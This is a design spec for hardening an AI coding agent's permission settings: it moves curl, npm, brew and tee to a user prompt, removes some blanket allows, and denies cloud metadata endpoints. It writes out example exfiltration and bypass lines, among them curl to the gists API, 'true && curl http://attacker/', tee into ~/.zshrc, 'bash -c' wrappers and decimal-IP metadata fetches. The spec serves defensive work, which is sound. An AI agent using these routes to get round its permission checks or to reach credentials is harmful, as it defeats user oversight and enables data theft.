# Specification: Permissions audit round 2 — CFA Android learnings

Feature: tighten five residual gaps in `claude/settings.json` identified by cross-referencing CFA Android's PR #8093 permissions review against the 054-058 epic's decisions. Carries forward the 054 epic's "conservative defaults for public safety" framing; applies it to specific patterns the epic did not address.

Parent backlog: `060-permissions-audit-round-2-cfa-learnings` (uuid `f8a2b3c4-5d6e-7f8a-9b0c-1d2e3f4a5b6c`).
Tier: **complex**. Criticality: **high**.

> **Background**: epic research and 054-058 decisions referenced but not reproduced. See `research/permissions-audit/research.md` (epic research with DR-1..DR-8), `lifecycle/apply-confirmed-safe-permission-tightening/spec.md` (056 — canonical "bundled removal" style), and `lifecycle/close-exfiltration-channels-in-sandbox-excluded-commands/spec.md` (058 — canonical "subcommand scoping + flag-position variants" style).

## Problem Statement

`claude/settings.json` is deployed as global user settings via `just setup`. Five residual gaps weaken the "conservative defaults" posture the 054 epic established. In order of severity they are: (1) `curl` to `api.github.com` is not gated at the permission layer — an agent with the template's defaults can invoke `curl https://api.github.com/gists` and reach the same API that the `gh gist create` deny was meant to protect, raising the naive-path effort required but not closing the channel for adversarial invocations (see Residual Risk in R1); (2) blanket allows for `docker`, `npm`, `brew`, `make`, `pip3` admit arbitrary-code-execution via package scripts, Makefile recipes, and post-install hooks; (3) `tee` bypasses `Edit(~/.zshrc)` deny because Edit-tool denies don't extend to Bash subprocesses; (4) `git checkout -- <file>` discards uncommitted changes destructively, mirroring the risk already covered by the `Bash(git restore *)` ask; (5) cloud metadata endpoints (`169.254.169.254` and variants) are not denied, leaving SSRF/credential-theft paths open if cortex-command is ever run in a cloud VM context. Adopters inheriting the template receive all five of these as latent risks without auditing.

This spec ships command-layer mitigations for all five. All five R-level changes are **best-effort naive-path mitigations**: each closes the straightforward invocation of the attack, but none closes interpreter-wrapper bypass (`bash -c`, per 057) or compound-command bypass if the latter is confirmed in plan phase. The strong-form architectural fixes (sandbox-layer enforcement, PreToolUse URL-validation hook) are out of scope for this ticket and listed in Non-Requirements.

## Requirements

Each requirement modifies `claude/settings.json` only. Acceptance criteria are binary-checkable via `jq` invocations against the file; the expected output and pass/fail test are listed inline.

**R1 — F1 (curl exfiltration)**: Move `Bash(curl *)` from `permissions.allow` to `permissions.ask`. This raises the effort to invoke curl toward `api.github.com`, `raw.githubusercontent.com`, `registry.npmjs.org`, and `*.anthropic.com` at the command layer without touching the sandbox network allowlist (Option A from the ticket is out of scope — see Non-Requirements). Propagates to existing installs via `cortex-sync-permissions.py`'s union merge; Claude Code's matcher evaluates the ask entry before the pre-existing allow entry in evaluation order (matcher-layer precedence, not hook-layer).

- Acceptance: `jq '.permissions.allow | map(select(. == "Bash(curl *)")) | length' claude/settings.json` returns `0` (pass if `0`).
- Acceptance: `jq '.permissions.ask | map(select(. == "Bash(curl *)")) | length' claude/settings.json` returns `1` (pass if `1`).
- Acceptance: `jq '.permissions.deny | map(select(. == "Bash(curl *)")) | length' claude/settings.json` returns `0` (pass if `0`; guard against accidental mis-placement).
- **Residual risk (acknowledged)**: R1 does not close compound-command bypasses (`true && curl …`) if plan-phase Q3 verification confirms that ask-tier rules do not survive compound-command decomposition; in that case R1 is a naive-path-only mitigation against accidental invocation and the Problem Statement's "exfiltration" framing should be read as "raise the naive-path bar," not "close the adversarial channel." R1 also does not cover `hooks/cortex-notify-remote.sh`'s `curl` invocation (see R1-adjacent Non-Requirement entry).

**R2 — F2a (docker)**: Remove `Bash(docker *)` from `permissions.allow`. Zero runtime callers in this repo; Anthropic's own sandboxing docs note `docker` is incompatible with the sandbox. Follows the 057 "remove entirely" pattern for unused heavy-interpreter allows. The command falls through to a default prompt when invoked.

- Acceptance: `jq '.permissions.allow | map(select(. == "Bash(docker *)")) | length' claude/settings.json` returns `0`.
- Acceptance: `jq '.permissions.ask | map(select(. == "Bash(docker *)")) | length' claude/settings.json` returns `0` (pure removal; not moved to ask).
- Acceptance: `jq '.permissions.deny | map(select(. == "Bash(docker *)")) | length' claude/settings.json` returns `0`.

**R3 — F2b (make)**: Remove `Bash(make *)` from `permissions.allow`. Zero runtime callers (no `Makefile` in repo; `just` is the task runner). Per GNU make docs, `make -n` is not safe even in dry-run mode. Follows the 057 pattern.

- Acceptance: `jq '.permissions.allow | map(select(. == "Bash(make *)")) | length' claude/settings.json` returns `0`.
- Acceptance: `jq '.permissions.ask | map(select(. == "Bash(make *)")) | length' claude/settings.json` returns `0`.
- Acceptance: `jq '.permissions.deny | map(select(. == "Bash(make *)")) | length' claude/settings.json` returns `0`.

**R4 — F2c (pip3)**: Remove `Bash(pip3 *)` from `permissions.allow`. Zero runtime callers (`uv run` / `uv sync` are the canonical Python tooling per CLAUDE.md; both are already in allow). `pip install` runs `setup.py` during build for sdists — arbitrary code execution. Follows the 057 pattern.

- Acceptance: `jq '.permissions.allow | map(select(. == "Bash(pip3 *)")) | length' claude/settings.json` returns `0`.
- Acceptance: `jq '.permissions.ask | map(select(. == "Bash(pip3 *)")) | length' claude/settings.json` returns `0`.
- Acceptance: `jq '.permissions.deny | map(select(. == "Bash(pip3 *)")) | length' claude/settings.json` returns `0`.

**R5 — F2d (npm)**: Move `Bash(npm *)` from `permissions.allow` to `permissions.ask`. Unlike docker/make/pip3, the UI skills (`skills/ui-setup`, `skills/ui-judge`, `skills/ui-a11y`, `skills/ui-lint`) legitimately invoke `npm install -D` and `npm run <script>` in target projects. Wholesale ask (rather than scoped subcommand allows) is chosen because: (a) `npm run <script>` runs arbitrary shell from `package.json` and script-name scoping provides zero defense against malicious package content; (b) glob patterns like `Bash(npm run test *)` likely do not match the common dash/colon script naming conventions (`test:unit`, `test-unit`) — verification deferred to plan phase; (c) wholesale ask is simpler, honest about the threat model, and matches the R6/R7 brew/tee treatment.

- Acceptance: `jq '.permissions.allow | map(select(. == "Bash(npm *)")) | length' claude/settings.json` returns `0`.
- Acceptance: `jq '.permissions.ask | map(select(. == "Bash(npm *)")) | length' claude/settings.json` returns `1`.
- Acceptance: `jq '.permissions.deny | map(select(. == "Bash(npm *)")) | length' claude/settings.json` returns `0`.

**R6 — F2e (brew)**: Move `Bash(brew *)` from `permissions.allow` to `permissions.ask`. Zero runtime callers in hooks/skills/scripts; only appears in documentation prose. Per Trail of Bits 2024 audit, Homebrew "allows arbitrary code execution by design" — Ruby formulae are executable, loadable from arbitrary URLs via `brew tap`. Wholesale ask rather than scoped-subcommand treatment for consistency with R5 (npm) and R7 (tee), and because the in-repo cost is zero (no callers).

- Acceptance: `jq '.permissions.allow | map(select(. == "Bash(brew *)")) | length' claude/settings.json` returns `0`.
- Acceptance: `jq '.permissions.ask | map(select(. == "Bash(brew *)")) | length' claude/settings.json` returns `1`.
- Acceptance: `jq '.permissions.deny | map(select(. == "Bash(brew *)")) | length' claude/settings.json` returns `0`.

**R7 — F3 (tee bypass)**: Move `Bash(tee *)` from `permissions.allow` to `permissions.ask`. Zero runtime callers. Raises the naive-path effort of the `tee -a ~/.zshrc` bypass of the `Edit(~/.zshrc)` deny.

*Rejection of the ticket's proposed targeted denies*: the ticket proposed `Bash(tee *~/.zshrc*)`, `Bash(tee *~/.bashrc*)`, `Bash(tee *~/.bash_profile*)`, `Bash(tee *~/.zprofile*)` as targeted denies. These are rejected in favor of wholesale ask because: (a) per Anthropic's own permission docs, Bash-argument constraints are documented-fragile — `tee /Users/foo/.zshrc` (absolute path), `F=~/.zshrc; tee $F` (variable indirection), and symlink-target tricks all bypass the targeted pattern; (b) wholesale ask matches R5/R6 style and is simpler to reason about; (c) the in-repo friction cost of wholesale ask is zero (grep-verified no runtime callers). The architecturally-correct fix for the Edit-deny bypass class is `sandbox.filesystem.denyWrite` which is out of scope (see Non-Requirements).

- Acceptance: `jq '.permissions.allow | map(select(. == "Bash(tee *)")) | length' claude/settings.json` returns `0`.
- Acceptance: `jq '.permissions.ask | map(select(. == "Bash(tee *)")) | length' claude/settings.json` returns `1`.
- Acceptance: `jq '.permissions.deny | map(select(. == "Bash(tee *)")) | length' claude/settings.json` returns `0`.

**R8 — F4 (git checkout -- discards changes)**: Add `Bash(git checkout -- *)` to `permissions.ask`. Symmetric with the 054-R2 treatment of the equivalent-risk `Bash(git restore *)` (already in ask). Ask beats allow in matcher evaluation order, so the existing `Bash(git checkout *)` allow remains effective for branch switching, `git checkout -b`, and other non-destructive forms.

- Acceptance: `jq '.permissions.ask | map(select(. == "Bash(git checkout -- *)")) | length' claude/settings.json` returns `1`.
- Acceptance: `jq '.permissions.deny | map(select(. == "Bash(git checkout -- *)")) | length' claude/settings.json` returns `0`.
- **Plan-phase verification (load-bearing)**: Before R8 commits, empirically verify that the glob `Bash(git checkout -- *)` does NOT match `git checkout --theirs file.py` or `git checkout --ours file.py`. See Plan-Phase Verification Protocol below. If the verification fails, R8's content is determined by the fallback specified in Open Decisions D1.

**R9 — F5 (cloud metadata endpoints)**: Add the following entries to `permissions.deny`:
- `WebFetch(domain:169.254.169.254)` — AWS EC2, GCP, Azure, Alibaba, DigitalOcean, Oracle (all converge on this IP)
- `WebFetch(domain:169.254.170.2)` — AWS ECS task metadata
- `WebFetch(domain:metadata.google.internal)` — GCP fully-qualified hostname
- `WebFetch(domain:api.metadata.cloud.ibm.com)` — IBM Cloud
- `WebFetch(domain:instance-data.ec2.internal)` — AWS EC2 DNS form

Short-form `WebFetch(domain:metadata)` is intentionally excluded to avoid collision with corporate DNS resolvers that may legitimately resolve `metadata` to an internal service. The Bash path (`curl http://169.254.169.254/`) is not covered by WebFetch denies; the Bash-side is raised by R1's curl→ask as a naive-path mitigation only (see R1 Residual Risk).

- Acceptance: `jq '.permissions.deny | map(select(. == "WebFetch(domain:169.254.169.254)")) | length' claude/settings.json` returns `1`.
- Acceptance: `jq '.permissions.deny | map(select(. == "WebFetch(domain:169.254.170.2)")) | length' claude/settings.json` returns `1`.
- Acceptance: `jq '.permissions.deny | map(select(. == "WebFetch(domain:metadata.google.internal)")) | length' claude/settings.json` returns `1`.
- Acceptance: `jq '.permissions.deny | map(select(. == "WebFetch(domain:api.metadata.cloud.ibm.com)")) | length' claude/settings.json` returns `1`.
- Acceptance: `jq '.permissions.deny | map(select(. == "WebFetch(domain:instance-data.ec2.internal)")) | length' claude/settings.json` returns `1`.
- **Plan-phase verification (load-bearing)**: Before R9 commits, empirically verify that `WebFetch(domain:<IP-literal>)` syntax actually enforces the block. See Plan-Phase Verification Protocol below. If the verification fails, R9 ships partially (hostname entries only); IP-literal entries are dropped from the spec and documented as best-effort per Open Decisions D2.

**R10 — JSON validity (per-commit invariant)**: `claude/settings.json` must remain valid JSON after every commit in the PR, not just the final commit. No trailing commas, no comments, no duplicate keys. This is a per-commit invariant, not a terminal acceptance.

- Acceptance (terminal): `python3 -m json.tool claude/settings.json > /dev/null` exits `0` on the final commit.
- Acceptance (per-commit invariant — see Technical Constraints for enforcement): `python3 -m json.tool claude/settings.json > /dev/null` exits `0` on every commit in the PR that touches `claude/settings.json`.

## Non-Requirements

- **`skipDangerousModePermissionPrompt: true` regression at `claude/settings.json:387`**: Research discovered this key was silently re-added by a 054-epic commit despite the 056 review marking it removed. User decision: leave as-is. Not in scope; do not touch.
- **AC#4 automated regression testing ("No regression in interactive or overnight workflows")**: the original ticket's AC#4 asks for no workflow regression. This spec does NOT include automated end-to-end regression tests for skills, hooks, or the overnight runner; the R-level acceptance criteria are jq-based structural checks against `claude/settings.json`. Workflow regression is covered by a **soft qualitative smoke check** in the plan phase (see Technical Constraints "Plan-Phase Smoke Check"), not by an automated acceptance criterion. For overnight specifically, the zero-impact claim is an unverified deduction from the established fact that the runner uses `--dangerously-skip-permissions`. This is an intentional scope boundary — a full regression suite is out of scope for a permissions-tightening ticket.
- **F1 Option A (removing `api.github.com` from `sandbox.network.allowedDomains`)**: the ticket proposed removing the domain from the sandbox allowlist. Research identified this as the only F1 option with dogfood risk (Claude Code plugin loader, overnight `gh` tooling via sandbox paths, `WebFetch` to github URLs may or may not bypass sandbox network policy). Not in scope — user decision during spec; R1 ships Option C (curl→ask) alone.
- **F1 Option B (`Bash(curl *api.github.com*)` deny)**: ticket option. Rejected by research as brittle per Anthropic docs (trivially bypassable via variable indirection, URL encoding, IP decimal). Not in scope.
- **Power-user override documentation (original ticket AC#3)**: the ticket required "power-user overrides documented in a comment or companion file so adopters know what they can add to `settings.local.json`". User decision during spec: no documentation deliverable. Adopters who need the removed convenience commands back will add them to their own `settings.local.json` using the standard Claude Code merge semantics. This intentionally leaves the 054 open question ("settings.local.json as mitigation diverges from version control") unresolved; resolving it is a separate concern from this tightening pass.
- **Cleanup of existing adopters' `settings.local.json`**: The sync hook union-merges forward only. Pre-existing `Bash(docker *)`, `Bash(npm *)`, etc. in users' `settings.local.json` files will persist after this change. Matches 056's non-requirement ("Propagation of removals to existing installs is out of scope"). Users can run `just setup-force` or manually edit if they want the tightening to apply to their own machine immediately.
- **Sync-hook propagation ratchet fix**: The cumulative effect of multiple removal rounds (054 removed 6 entries; this round removes 3 more) creates growing divergence between the template and existing installs. Fixing this requires adding a removal-propagation mechanism to `cortex-sync-permissions.py`. Out of scope for this ticket; **will be filed as a separate backlog follow-up at spec transition** with the proposed mechanism (`_globalPermissionsVersion` marker + `_cleanupEntries` list that the sync hook subtracts on version bump).
- **`hooks/cortex-notify-remote.sh` curl channel**: Line 56 invokes `curl -s --max-time 5 -d "$MESSAGE" -H "Title: $TITLE" "https://ntfy.sh/$NTFY_TOPIC"`. Hooks execute under the shell directly — Claude Code's permission matcher does NOT gate hook commands. R1 does NOT close this channel, even though `$MESSAGE` and `$TITLE` are derived from session-level event data that may be influenced by an adversarial session. Not in scope for this ticket (hooks bypass the permission matcher by design). **Will be filed as a separate backlog follow-up**: "Harden cortex-notify-remote.sh curl invocation against exfiltration via adversarial event data" — proposed mitigations include argument-quoting audit, strict content-length limit, and/or routing notifications via a different mechanism.
- **`sandbox.filesystem.denyWrite` for rc files**: The architecturally-correct fix for the Edit-deny bypass class (F3 tee is one instance of a broader category that includes `cat >`, `dd of=`, `python -c "open(...)"`, `printf >>`) is OS-level `sandbox.filesystem.denyWrite: ["~/.zshrc", ...]`. Out of scope — separate architectural concern; R7 ships a Bash-layer ask as a best-effort command-layer mitigation.
- **PreToolUse URL validation hook**: Per Anthropic's own docs, the canonical fix for curl-argument pattern fragility is a PreToolUse hook that parses compound commands and validates URLs against an allowlist. Out of scope — R1 ships the command-layer ask as the simpler option.
- **Interpreter-wrapper bypass**: 057's spike confirmed that `bash -c "git checkout -- ."`, `python3 -c "..."`, etc. bypass all Bash deny/ask rules because matching only checks the top-level token. All ask-tier requirements in this spec (R1, R5, R6, R7, R8) are subject to this pre-existing bypass and are best-effort naive-path mitigations only. The 057 epic accepted this as OPEN; this ticket does not re-litigate.
- **Compound-command bypass**: External research suggests Claude Code's deny evaluator may only check the first token of compound commands — if confirmed, `true && curl http://attacker/` bypasses R1's curl ask. Plan-phase verification item (see Plan-Phase Verification Protocol). If confirmed vulnerable, the spec is NOT re-opened — this is accepted as residual risk consistent with 057's acceptance of the interpreter-wrapper bypass. Mitigation is a PreToolUse hook (out of scope).
- **Bash-layer metadata endpoint denies**: R9 covers `WebFetch` only. Corresponding Bash-layer denies (`Bash(curl *169.254.169.254*)`, `Bash(wget *metadata.google.internal*)`, etc.) are intentionally NOT added — brittle (decimal IP encoding: `curl http://2852039166/`; variable indirection) and the 054 epic already rejected this pattern class. The Bash-side metadata path is indirectly raised by R1 (curl → ask) as naive-path mitigation only.
- **Context7 / perplexity / other MCP server allowedDomains additions**: User flagged during spec that MCP servers may or may not inherit the Seatbelt sandbox, and if they do, their API domains may need to be in `allowedDomains`. Separate investigation — out of scope.
- **Round-1 residual entries in the owner's `settings.local.json`**: Contains pre-054 entries (`Bash(bash *)`, `Bash(sh *)`, `Bash(python *)`, etc.) the sync hook cannot remove. Dogfooding concern, not a template concern. Not in scope.
- **Read/Bash bypass (`cat *` reads files that Read deny rules block)**: Carried forward from ticket Out of Scope — fundamental Claude Code limitation per 054 research. No clean fix without removing `cat`/`grep` from allow.
- **Sandbox filesystem read scope**: Carried forward from ticket Out of Scope — depends on Claude Code sandbox implementation, not configurable via permissions.

## Edge Cases

- **F4 pattern vs `git checkout --theirs` / `--ours`**: Plan-phase verification required. If the pattern `Bash(git checkout -- *)` accidentally matches `git checkout --theirs file.py`, any interactive conflict-resolution subagent hits an ask prompt every time. `claude/pipeline/conflict.py` uses `subprocess.run` directly (not Claude's Bash tool) so the pipeline fast-path is unaffected regardless; the concern is Claude-invoked repair paths only. Fallback selection rule is resolved in Open Decisions D1.
- **F5 `WebFetch(domain:<IP literal>)` matcher behavior**: Undocumented in Claude Code permission syntax. Plan-phase verification required. The existing `WebFetch(domain:0.0.0.0)` deny from 056 was never empirically tested. Fallback selection rule resolved in Open Decisions D2.
- **R1 curl ask friction with `ui-judge` / `ui-a11y` / `ui-check` dev-server probes**: These skills invoke `curl -s --head --max-time 5 http://localhost:PORT`. First invocation per session hits the ask prompt; subsequent invocations within the session reuse the session-scoped approval. Acceptable friction.
- **R5 npm ask friction across UI skills**: Four skills legitimately invoke npm — `skills/ui-setup` (runs `npm install -D <pkg>`), `skills/ui-judge` (may run `npm run dev`), `skills/ui-a11y` (runs `npm install -D @playwright/test`, `npm run` commands), `skills/ui-lint` (runs `npm run lint` or equivalent). Each skill's first npm invocation per session prompts once; subsequent invocations reuse the session-scoped approval. Acceptable friction; simpler than scoped subcommand allows.
- **R1/R5/R6/R7/R8 propagation via sync hook vs matcher precedence** (two-layer mechanism): `cortex-sync-permissions.py` performs per-array union merge on `allow`/`ask`/`deny` (hook layer — does NOT enforce precedence). Claude Code's permission matcher evaluates `deny → ask → allow`, first match wins (matcher layer — enforces precedence at runtime). For a "move allow → ask" change: the hook adds the ask entry to the local file but does NOT remove the existing allow entry; at runtime, the matcher hits the ask entry first and prompts. Both entries are present in the file; the matcher decides which wins. This is two separate mechanisms — the hook doesn't know or enforce precedence; the matcher does.
- **R2/R3/R4 propagation via sync hook**: Pure removals from global allow do NOT propagate — existing users keep the broader allow in their `settings.local.json`. Matches 056 non-requirement. Owner can run `just setup-force` or manually clean.
- **R9 propagation via sync hook**: Deny additions propagate via union merge. At runtime, the matcher hits the deny entry first (deny > ask > allow) and blocks. Best-case propagation semantics.

## Changes to Existing Behavior

- **MODIFIED**: `Bash(curl *)` moves from `permissions.allow` to `permissions.ask` — every session's first curl invocation prompts the user.
- **REMOVED**: `Bash(docker *)`, `Bash(make *)`, `Bash(pip3 *)` removed from `permissions.allow`. These commands fall through to the default prompt on invocation in interactive sessions; overnight is unaffected (bypasses permissions).
- **MODIFIED**: `Bash(npm *)`, `Bash(brew *)`, `Bash(tee *)` move from `permissions.allow` to `permissions.ask` — session-scoped prompt on first invocation.
- **ADDED**: `Bash(git checkout -- *)` entry in `permissions.ask`. Catches destructive discard-changes form; branch switching and other safe `git checkout` forms remain allowed.
- **ADDED**: 5 `WebFetch(domain:...)` deny entries for cloud metadata endpoints.
- **ORDERING**: The PR delivers these as 6 per-finding commits (see Technical Constraints "Commit discipline" for details). Each commit individually revertable.

## Technical Constraints

- **`claude/settings.json` is the single source of truth**; never edit `~/.claude/settings.json` directly. Deployment is via `just setup` (first install) or `just setup-force` (overwrite).
- **Must remain valid JSON on every commit** (not just the terminal commit). R10 is a per-commit invariant. The plan phase enforces this by running `python3 -m json.tool claude/settings.json > /dev/null` after each commit step as part of the plan's Verification field.
- **Per-commit regression invariant**: Each intermediate commit must (a) leave `claude/settings.json` valid JSON, (b) pass all acceptance criteria for requirements whose changes have been applied at that point in the commit sequence, (c) not regress any previously-passing acceptance criterion. The plan phase enforces this by maintaining a cumulative expected-acceptance list and running all applicable jq checks after each commit step.
- **Plan-Phase Verification Protocol (load-bearing empirical tests)**: The plan phase runs ALL THREE verifications at the start of the plan (before ANY commits land), in a single test session:
  1. **Q1 (R8 git checkout glob)**: In an interactive session, invoke `git checkout -- <throwaway-file>` (must prompt) and `git checkout --theirs <throwaway-file>` (must NOT prompt). Record both outcomes.
  2. **Q4 (R9 WebFetch IP literal)**: Apply the R9 deny entries temporarily via `.claude/settings.local.json` override, then attempt `WebFetch https://169.254.169.254/` (must be blocked). Record the outcome.
  3. **Q3 (compound-command bypass)**: Apply R1's curl→ask temporarily, then attempt `true && curl http://example.com/` (must prompt for curl). Record the outcome.
  - Results determine the R8 and R9 commit content per Open Decisions D1/D2 below. Q3's outcome is recorded but does NOT change the spec — R1 is shipped regardless and the outcome only determines whether R1's residual risk is acknowledged in the commit message or silently carried as an already-documented Non-Requirement.
- **Plan-Phase Smoke Check (soft gate for AC#4)**: After all commits land, run a qualitative smoke check as a plan-phase verification step: (a) `python3 -m json.tool claude/settings.json > /dev/null` passes (already covered by R10); (b) in a fresh interactive Claude Code session, invoke one representative command from each ask-tier change (e.g., `curl http://localhost:9999/test`, any `tee` invocation to verify prompt, any `npm --version`, any `brew --version`) and confirm a permission prompt appears; (c) run `gh pr list` and confirm it still works (sanity check that nothing sandbox-adjacent was accidentally perturbed). This is a qualitative check, not an automated acceptance criterion. If any step fails unexpectedly (hard failure, not prompt), plan phase halts and the responsible commit is reverted or amended before the PR merges.
- **Overnight-runner impact is zero for all R-level changes** (logical deduction, not empirically verified per AC#4 non-requirement). Overnight uses `--dangerously-skip-permissions` which bypasses the permission matcher entirely; only `sandbox.*` config affects overnight. This spec does not touch `sandbox.*`.
- **Sync hook propagation** (`claude/hooks/cortex-sync-permissions.py`): deny/ask additions propagate automatically via the hook's per-array union merge. Allow removals do NOT propagate (additive-only merge). Owner runs `just setup-force` to propagate R2/R3/R4 locally; this is a one-time manual step and is not part of the automated acceptance. See Edge Cases for the two-layer mechanism distinction (hook = union merge; matcher = precedence).
- **Commit discipline**: Implementation is delivered as **6 per-finding commits within one PR**, matching the 054 epic's per-finding commit pattern. Required ordering:
  1. **R1 curl→ask** — highest severity in scope, cleanest reversibility surface.
  2. **R9 metadata denies** — additive-only deny (no removals).
  3. **R7 tee→ask** — small targeted change.
  4. **R8 git checkout -- ask** — small targeted change; verification already run in Plan-Phase Verification Protocol.
  5. **R2+R3+R4 docker/make/pip3 removals** — homogeneous removal bundle (matches 056's bundled-removal pattern).
  6. **R5+R6 npm/brew moves to ask** — homogeneous move-to-ask bundle.
  - Rationale: commits 5 and 6 are split (not bundled as R2-R6) because they are heterogeneous operation types (removals vs moves). Splitting produces a homogeneous diff per commit, easier review, cleaner bisect. Each commit individually revertable.
  - Commit subjects: imperative mood, ≤72 chars. Suggested drafts:
    - `Move Bash(curl *) to ask tier for exfiltration control`
    - `Add cloud metadata endpoint denies to WebFetch`
    - `Move Bash(tee *) to ask tier for rc-file bypass`
    - `Add Bash(git checkout -- *) to ask tier`
    - `Remove blanket docker/make/pip3 allows (no repo callers)`
    - `Move Bash(npm *) and Bash(brew *) to ask tier`
  - No `$(cat <<EOF)` heredocs in commit messages (sandbox constraint). Use `/commit` skill — never `git commit` manually.
- **Spec style reference**: match 056 spec (`lifecycle/apply-confirmed-safe-permission-tightening/spec.md`) structure — R-numbered requirements with jq-based acceptance criteria.

## Open Decisions

These decisions are **resolved at spec time** in the sense that their resolution criteria, fallback paths, and decision authority are all explicitly defined here. They are listed as "Open" because the specific outcome depends on empirical test results run during the Plan-Phase Verification Protocol — but the spec provides deterministic fallback selection based on those results.

- **D1 — R8 pattern fallback (resolution authority: plan phase, per verification protocol)**: If Q1 verification confirms `Bash(git checkout -- *)` does NOT match `git checkout --theirs/--ours` → ship R8 as written (the primary form). If Q1 confirms the glob DOES match `--theirs`/`--ours` → fall back to **the enumerated safe-forms approach**: replace `Bash(git checkout -- *)` ask with THREE entries: (a) `Bash(git checkout --theirs *)` allow (explicit whitelist for fast-path), (b) `Bash(git checkout --ours *)` allow (same), (c) `Bash(git checkout -- .)` ask (the nuclear "discard all" form only). Rationale: the symmetric-with-054-R2 claim is preserved for the nuclear form, `--theirs`/`--ours` fast-path is explicitly unblocked, and single-file `git checkout -- file.py` falls through to the existing `Bash(git checkout *)` allow (looser than ideal but acceptable given `git restore file.py` is in ask as the preferred path). The plan phase has authority to implement this fallback without re-opening the spec.

- **D2 — R9 IP-literal matcher fallback (resolution authority: plan phase, per verification protocol)**: If Q4 verification confirms `WebFetch(domain:169.254.169.254)` actually enforces → ship R9 as written (5 entries). If Q4 confirms IP-literal matching silently fails → **ship R9 partially**: keep the three hostname entries (`metadata.google.internal`, `api.metadata.cloud.ibm.com`, `instance-data.ec2.internal`); drop the two IP-literal entries (`169.254.169.254`, `169.254.170.2`) from the commit AND update the R9 acceptance criteria in a plan-phase spec amendment comment (not a spec re-open) noting the drop. Document the IP-form gap in the commit message as "IP-literal matching unsupported by Claude Code; shipping hostname coverage only; full coverage depends on PreToolUse hook or sandbox enforcement (both out of scope per Non-Requirements)". The plan phase has authority to implement this fallback without re-opening the spec. Fallback option (b) from earlier draft language ("add Bash-layer denies as secondary control") is explicitly foreclosed by the Non-Requirements entry on Bash-layer metadata endpoint denies — do not revive.

- **D3 — Q3 compound-command bypass verification consequence**: If Q3 verification shows ask rules survive compound commands → R1 provides the full exfiltration closure framed in the Problem Statement; no change. If Q3 shows compound commands bypass ask → R1 is a naive-path mitigation per the Residual Risk already acknowledged in R1's text and the Non-Requirements entry on compound-command bypass. The spec is NOT re-opened regardless of outcome; the Problem Statement is explicitly written to be honest about both possibilities ("raise the naive-path effort" + Residual Risk section). Decision authority: plan phase records the outcome in the Q3 verification note but takes no further action on the spec.

All three decisions have deterministic resolution rules. The plan phase does not have license to invent new fallbacks or re-open the spec; it follows D1/D2/D3 as written.
